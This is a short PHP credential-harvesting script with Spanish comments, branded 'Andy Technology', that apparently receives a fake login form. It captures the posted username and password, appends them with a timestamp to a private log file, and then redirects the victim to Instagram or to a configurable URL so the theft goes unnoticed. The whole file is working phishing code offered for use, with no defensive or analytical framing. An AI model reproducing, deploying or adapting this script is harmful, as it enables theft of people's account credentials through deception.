<?php
// SISTEMAS TECNOLÓGICOS DE ANDY - Capturador Final
$log = "registro_privado.txt"; 
$archivo_config = "destino.txt"; 
$fecha = date('d-m-Y H:i:s');

// 1. Captura de datos del formulario
$usuario = isset($_POST['user_id']) ? $_POST['user_id'] : 'No definido';
$password = isset($_POST['user_pass']) ? $_POST['user_pass'] : 'No definido';

// 2. Formato de guardado Andy Technology
$reporte = "====================================\n";
$reporte .= "CAPTURADO POR: ANDY TECHNOLOGY\n";
$reporte .= "Fecha: $fecha\n";
$reporte .= "Usuario: $usuario\n";
$reporte .= "Password: $password\n";
$reporte .= "====================================\n\n";

// 3. Guardado en archivo (FILE_APPEND evita sobrescribir)
file_put_contents($log, $reporte, FILE_APPEND);

// 4. Lógica de redirección dinámica
if (file_exists($archivo_config)) {
    $url_destino = trim(file_get_contents($archivo_config));
} else {
    $url_destino = "https://www.instagram.com"; 
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Cargando...</title>
    <script type="text/javascript">
        window.location.href = "<?php echo $url_destino; ?>";
    </script>
</head>
<body>
</body>
</html>
